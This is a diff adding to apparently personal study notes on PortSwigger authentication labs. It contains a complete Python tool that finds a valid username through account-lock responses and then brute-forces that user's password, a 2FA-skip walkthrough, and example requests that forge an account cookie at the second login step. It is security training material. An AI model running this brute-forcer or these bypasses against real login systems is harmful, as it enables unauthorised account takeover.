@@ -1157,23 +1157,434 @@ This lab is vulnerable to username enumeration. It uses account locking, but thi
 - [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
 - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
 
+**Screenshots:**
+
+![01-terminal-phase1](images/lab-0.5-username-enumeration-account-lock/01-terminal-phase1.png)
+
+
+![02-terminal-result](images/lab-0.5-username-enumeration-account-lock/02-terminal-result.png)
+
+![03-solved](images/lab-0.5-username-enumeration-account-lock/03-solved.png)
+
+##### Tutorial
+
+1. Send `POST /login` with an invalid username + password to Burp Intruder
+2. Cluster bomb: payload position on `username`, plus a Null payload position at the end (`&password=example§§`) → each username repeated 5x
+3. The username whose responses contain `You have made too many incorrect login attempts` is the valid one
+4. Wait ~1 minute for the account lock to reset
+5. Sniper attack: set the valid username, payload position on `password`, grep-extract the error message
+6. The response with **no** error message (or a 302) is the correct password → log in and open the account page
+
+
+**Command:**
+
+```python
+python3 "Username-enumeration-via-account-lock.py" \
+  --url "https://0abd00db04a6e87780aabc13002600b1.web-security-academy.net/login" \
+  --cookie "session=dspuGwXWB1NVTRIdL3EvEGSvWIfgIYcK" \
+  --usernames usernames.txt \
+  --passwords passwords.txt \
+  --repeats 5 --wait 65
+```
+
+**Tool:**
+
+```python
+#!/usr/bin/env python3
+"""
+Username enumeration via account lock (PortSwigger lab solver).
+
+Lab logic:
+  - 3 failed logins lock an account; further attempts against that account return
+    "You have made too many incorrect login attempts" while unknown usernames
+    keep returning the normal "Invalid username or password".
+  - So hammer each candidate username several times in a row (Burp calls this a
+    cluster bomb with Null payloads). The username whose responses contain the
+    lock message is the valid one.
+  - Wait for the lock to reset, then brute-force that user's password. A
+    response without any error message (or a 302) is the correct password.
+
+No hardcoded usernames, passwords or error strings — all come from files/flags.
+
+Usage:
+  python3 Username-enumeration-via-account-lock.py \
+      --url https://<id>.web-security-academy.net/login \
+      --cookie "session=..." \
+      --usernames usernames.txt --passwords passwords.txt
+
+  ... --repeats 5          # attempts per username (default 5)
+  ... --wait 65            # seconds to wait for the lock to reset (default 65)
+  ... --verbose
+  ... --csv attempts.csv
+  ... --proxy http://127.0.0.1:8080
+"""
+from __future__ import annotations
+
+import argparse
+import csv
+import re
+import sys
+import time
+from pathlib import Path
+from urllib.parse import urlparse
+
+try:
+    import requests
+    from requests import RequestException
+except ImportError:
+    print('error: pip3 install requests', file=sys.stderr)
+    sys.exit(2)
+
+
+def load_list(path: Path) -> list[str]:
+    out, seen = [], set()
+    for line in path.read_text(encoding='utf-8', errors='replace').splitlines():
+        s = line.strip()
+        if s and s not in seen:
+            seen.add(s)
+            out.append(s)
+    return out
+
+
+def norm(t: str) -> str:
+    return re.sub(r'\s+', ' ', t or '').strip().lower()
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser(
+        description='Username enumeration via account lock.')
+    ap.add_argument('--url', required=True)
+    ap.add_argument('--cookie', default='')
+    ap.add_argument('--usernames', default='usernames.txt')
+    ap.add_argument('--passwords', default='passwords.txt')
+    ap.add_argument('--user-field', default='username')
+    ap.add_argument('--pass-field', default='password')
+    ap.add_argument('--fixed-password', default='example',
+                    help='password used while hammering usernames (default: example)')
+    ap.add_argument('--repeats', type=int, default=5,
+                    help='attempts per username (default 5)')
+    ap.add_argument('--wait', type=float, default=65.0,
+                    help='seconds to wait for the lock to reset (default 65)')
+    ap.add_argument('--lock-regex', default=r'too many incorrect login attempts',
+                    help='regex marking a locked account')
+    ap.add_argument('--invalid-regex', default=r'invalid username or password',
+                    help='regex marking a normal failed login')
+    ap.add_argument('--user-agent', default='Mozilla/5.0 (AccountLock)')
+    ap.add_argument('--proxy', default='')
+    ap.add_argument('--delay', type=float, default=0.0)
+    ap.add_argument('--timeout', type=float, default=20.0)
+    ap.add_argument('--insecure', action='store_true')
+    ap.add_argument('--all', action='store_true',
+                    help='do not stop at the first valid username')
+    ap.add_argument('--verbose', action='store_true')
+    ap.add_argument('--csv', default='')
+    args = ap.parse_args()
+
+    usernames = load_list(Path(args.usernames))
+    passwords = load_list(Path(args.passwords))
+    if not usernames or not passwords:
+        print('error: username/password wordlist is empty', file=sys.stderr)
+        return 2
+
+    s = requests.Session()
+    s.headers.update({
+        'User-Agent': args.user_agent,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Content-Type': 'application/x-www-form-urlencoded',
+    })
+    if args.cookie:
+        s.headers['Cookie'] = args.cookie
+
+    p = urlparse(args.url)
+    vhost = f'{p.scheme}://{p.netloc}'
+    s.headers['Origin'] = vhost
+    s.headers['Referer'] = vhost + '/login'
+
+    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
+    verify = not args.insecure
+    lock_re = re.compile(args.lock_regex, re.I)
+    invalid_re = re.compile(args.invalid_regex, re.I)
+
+    rows: list[tuple[str, str, str, int, str]] = []
+
+    def post(user: str, pwd: str):
+        try:
+            r = s.post(args.url,
+                       data={args.user_field: user, args.pass_field: pwd},
+                       timeout=args.timeout, allow_redirects=False,
+                       proxies=proxies, verify=verify)
+        except RequestException as e:
+            print(f'[!] request error ({user}) -> {e}', file=sys.stderr)
+            time.sleep(1)
+            return None
+        if args.delay:
+            time.sleep(args.delay)
+        return r
+
+    # ---------- PHASE 1: find the lockable (valid) username ----------
+    print(f'[*] PHASE 1: {len(usernames)} usernames x {args.repeats} attempts '
+          f'(fixed pw="{args.fixed_password}")', file=sys.stderr)
+    valid: list[str] = []
+    for i, u in enumerate(usernames, 1):
+        locked = False
+        for _ in range(args.repeats):
+            r = post(u, args.fixed_password)
+            if r is None:
+                continue
+            body = r.text or ''
+            rows.append(('user', u, args.fixed_password, r.status_code,
+                         'lock' if lock_re.search(norm(body)) else ''))
+            if lock_re.search(norm(body)):
+                locked = True
+                break
+        if locked:
+            print(f'[+] LOCKED (valid username): {u}', file=sys.stderr)
+            valid.append(u)
+            if not args.all:
+                break
+        elif i % 10 == 0:
+            print(f'[*] {i}/{len(usernames)}', file=sys.stderr)
+
+    if not valid:
+        print('[-] no lockable username found', file=sys.stderr)
+        if args.csv:
+            with open(args.csv, 'w', newline='', encoding='utf-8') as f:
+                w = csv.writer(f)
+                w.writerow(('phase', 'user', 'pass', 'status', 'note'))
+                w.writerows(rows)
+        return 1
+
+    # ---------- wait for the lock to reset ----------
+    print(f'[*] waiting {args.wait:.0f}s for the account lock to reset',
+          file=sys.stderr)
+    time.sleep(args.wait)
+
+    # ---------- PHASE 2: crack the password ----------
+    print(f'[*] PHASE 2: {len(passwords)} passwords for {valid}', file=sys.stderr)
+    hits: list[tuple[str, str, int]] = []
+    for u in valid:
+        for pw in passwords:
+            r = post(u, pw)
+            if r is None:
+                continue
+            body = r.text or ''
+            status = r.status_code
+            rows.append(('pass', u, pw, status,
+                         'lock' if lock_re.search(norm(body)) else ''))
+            n = norm(body)
+            if status in (301, 302, 303, 307, 308):
+                print(f'[+] HIT {u}:{pw} status={status}', file=sys.stderr)
+                hits.append((u, pw, status))
+                break
+            if not invalid_re.search(n) and not lock_re.search(n):
+                print(f'[+] HIT {u}:{pw} status={status} (no error message)',
+                      file=sys.stderr)
+                hits.append((u, pw, status))
+                break
+
+    if args.csv:
+        with open(args.csv, 'w', newline='', encoding='utf-8') as f:
+            w = csv.writer(f)
+            w.writerow(('phase', 'user', 'pass', 'status', 'note'))
+            w.writerows(rows)
+        print(f'[*] CSV: {args.csv}', file=sys.stderr)
+
+    if hits:
+        for u, pw, st in hits:
+            print(f'HIT {u}:{pw} ({st})')
+        return 0
+    print('[-] password not found', file=sys.stderr)
+    return 1
+
+
+if __name__ == '__main__':
+    sys.exit(main())
+```
+
+##### Reference
+
+<details>
+<summary>6. Authentication Vulnerabilities - Lab #7 Username enumeration via account lock | Short Version — Rana Khalil</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=fT31xo1cUoM
+Purpose: This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, we enumerate a valid username, brute-force this user's password, then access their account page.
+
+</details>
+
+<details>
+<summary>7. Authentication Vulnerabilities - Lab #6 Broken brute-force protection, IP block | Short Version — Michael Sommer</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=BoA-ms_h3HY
+Purpose: This video shows the lab solution of "Username enumeration via account lock" from Web Security Academy (Portswigger)
+
+</details>
+
 </details>
 
 ### User rate limiting
 
+Another way websites try to prevent brute-force attacks is through user rate limiting. In this case, making to many login requests within a short period of time causes your IP address to be blocked. Typically, the IP can only be unblocked in one of the following ways:
+
+- Automatically after a certain period of time has elapsed
+- Manually by an administrator
+- Manually by the user after successfully completing a CAPTCHA
+
+user rate limiting is sometimes preferred to account locking due to being less prone to username enumeration and denial of service attacks. However, it is still not completely secure. As we saw an example of in an earlier lab, there are several ways an attacker can manipulate their apparent IP in order to bypass the block.
+
+As the limit is based on the rate of HTTP requests sent from the user's IP address, it is sometimes also posible to bypass this defense if you can work out how to guess multiple passwords with a single request.
+
 ### HTTP basic authentication
+
+Although faily old, its relative simplicity and ease of implementation means you might sometimes see HTTP basic authentication being used. In HTTP basic authentication, the client receives an authentication token from the server, which is constructed by concatenating the username and password, and encoding it in Base64. This token is stored and managed by the browser, which automatically adds it to the `Authorization` header of every subsequent request as follows:
+
+```
+Authorization: Basic base64(username:password)
+```
+
+### HTTP basic authentication - Continued
+
+For a number of reasons, this is generally not considered a secure authentication method. Firstly, it involves repeatedly sending the user's login credentials with every request. Unless the website also implements HSTS, user credentials are open to being captured in a man-in-the-middle attack.
+
+In addition, implementations of HTTP basic authentication often don't support brute-force protection. As the token consists exclusively of static values, this can leave it vulnerable to being brute-forced.
+
+HTTP basic authentication is also particularly vulnerable to session-related exploits, notably CSRF, against which it offers no protection on its own.
+
+In some cases, exploiting vulnerable HTTP basic authentication might only grant an attacker access to a seemingly uninteresting page. However, in addition to providing a futher attack surface, the credentials exposed in this way might be reused in other, more confidential contexts.
 
 ## Vulnerabilities in multi-factor authentication
 
+In this section, we'll look at some of the vulnerabilities that can occur in multi-factor authentication mechanisms. We've also provided several interactive labs to demonstrate how you can exploit these vulnerabilities in multi-factor authentication.
+
+Many websites rely exclusively on single-factor authentication using a password to authenticate users. However, some require users to prove their identity using multiple authentication factors.
+
+## Vulnerabilities in multi-factor authentication - Continued
+
+Verifying biometric factors is impractical for most websites. However, it is increasingly common to see both mandatory and optional two-factor authentication (2FA) based on *something you know* and *something you have*. This usually requires users to enter both a traditional password and a temporary verification code from an out-of-band physical device in their possession.
+
+While it is sometimes possible for an attacker to obtain a single knowledge-based factor, such as a password, being able to simultaneously obtain another factor from an out-of-band source is considerably less likely. For this reason, two-factor authentication is demonstrably more secure than single-factor authentication. However, as with any security measure, it is only ever as secure as its implementation. Poorly implemented two-factor authentication can be beaten, or even bypassed entirely, just as single-factor authentication can.
+
+It is also worth noting that the full benefits of multi-factor authentication are only achieved by verifying multiple *different* factors. Verifying the same factor in two different ways is not true two-factor authentication. Email-based 2FA is one such example. Although the user has to provide a password and a verification code, accessing the code only relies on them knowing the login credentials for their email account. Therefore, the knowledge authentication factor is simply being verified twice.
+
 ### Two-factor authentication tokens
+
+Verification codes are usually read by the user from a physical device of some kind. Many high-security websites now provide users a dedicated device for this purpose, such as the RSA token or keypad device that you might user to access your online banking or work laptop. In addition to being purpose-built for security, these dedicated devices also have the advantage of generating the verification code directly. It is also common for websites to use a dedicated mobile app, such as Google Authenticator, for the same reason.
+
+On the other hand, some websites send verification codes to a user's mobile phone as a text message. While this is technically still verifying the factor of "something you have", it is open to abuse. Firstly, the code is being transmitted via SMS rather than being generated by the device itself. This creates the potential for the code to be intercepted. There is also a risk of SIM swapping, whereby an attacker fraudlently obtains a SIM card with the victim's phone number. The attacker would then receive all SMS messages sent to the victim, including the one containing their verification code.
 
 ### Bypassing two-factor authentication
 
+At times, the implementation of two-factor authentication is flawed to the point where it can be bypassed entirely.
+
+If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code. In this case, it is worth testing to see if you can directly skip to "logged-in only" pages after completing the first authentication step. Occasionally, you will find that a website doesn't actually check whether or not you completed the second step before loading the page.
+
 ##### Lab: 2FA simple bypass
+
+This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not access to the user's 2FA verification code.
+
+<details>
+<summary>Lab details, screenshots & walkthrough 0.6</summary>
+
+**Screenshots:**
+
+![01-login](images/lab-0.6-2fa-simple-bypass/01-login.png)
+
+![02-email-client](images/lab-0.6-2fa-simple-bypass/02-email-client.png)
+
+![03-account](images/lab-0.6-2fa-simple-bypass/03-account.png)
+
+![04-account](images/lab-0.6-2fa-simple-bypass/04-account.png)
+
+![05-code](images/lab-0.6-2fa-simple-bypass/05-code.png)
+
+![06-code](images/lab-0.6-2fa-simple-bypass/06-code.png)
+
+![07-solved](images/lab-0.6-2fa-simple-bypass/07-solved.png)
+
+
+To solve the lab, access Carlos's account page.
+
+- Your credentials: wiener:peter
+- Victim's credentials carlos:montoya
+
+##### Tutorial
+
+1. Log in with your own account (`wiener:peter`) and open the **Email client** (exploit server) — this lab emails the 2FA code to the address you control
+2. Read the 4-digit `security code` from the email client, submit it on the login page, and confirm you land on **My account** (`Your username is: wiener`)
+3. Log out, then log in with the victim's credentials (`carlos:montoya`) — the server redirects to the 2FA prompt (`Enter your 4-digit security code`) and you do not have that code
+4. Instead of guessing, drop the `/login` path from the URL and request **`/my-account` directly** — the session is already authenticated, so the 2FA step is skipped
+5. The page returns `Your username is: carlos` (`carlos@carlos-montoya.net`) — the lab registers `is-solved` and shows `Congratulations, you solved the lab`
+
+**Key point:** 2FA was enforced on the login flow only. `/my-account` was protected by the session cookie alone, so navigating to it directly bypasses the second factor.
+
+##### Reference
+
+<details>
+<summary>8. Authentication Vulnerabilities - Lab #2 2FA simple bypass | Short Version — Rana Khalil</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=2WpBVanEn3M
+Purpose: This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, we access Carlos's account page.
+
+</details>
+
+<details>
+<summary>9. 2FA simple bypass| Short Version — Michael Sommer</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=V-Ak7kiOQI4
+Purpose: This video shows the lab solution of "2FA simple Bypass" from Web Security Academy (Portswigger)
+
+</details>
+
+</details>
 
 ### Flawed two-factor verification logic
 
+Somethimes flawed logic in two-factor authentication means that after a user has completed the intial login step, the website doesn't adequately verify that the same user is completing the second step.
+
+For example, the user logs in with their normal credentials in the first step as follows:
+
+```
+POST /login-steps/first HTTP/1.1
+Host: vulnerable-website.com
+...
+username=carlos&password=qwerty
+```
+They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:
+
+```
+HTTP/1.1 200 OK
+Set-Cookie: account=carlos
+
+GET /login-steps/second HTTP/1.1
+Cookie: account=carlos
+```
+When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:
+
+```
+POST /login-steps/second HTTP/1.1
+Host: vulnerable-website.com
+Cookie: account=carlos
+...
+verification-code=123456
+```
+In this case, an attacker could log in using their own credentials but then change the value of the `account` cookie to any arbitrary username when submitting the verification code.
+
+```
+POST /login-steps/second HTTP/1.1
+Host: vulnerable-website.com
+Cookie: account=victim-user
+...
+verification-code=123456
+```
+This is extremely dangerous if the attacker is then able to brute-force the verification code as it would allow them to log in to arbitrary user's accounts based entirely on their username. They would never need to know the user's password.
+
 ##### Lab: 2FA broken logic
+
+
 
 ### Brute-forcing 2FA verification codes
 
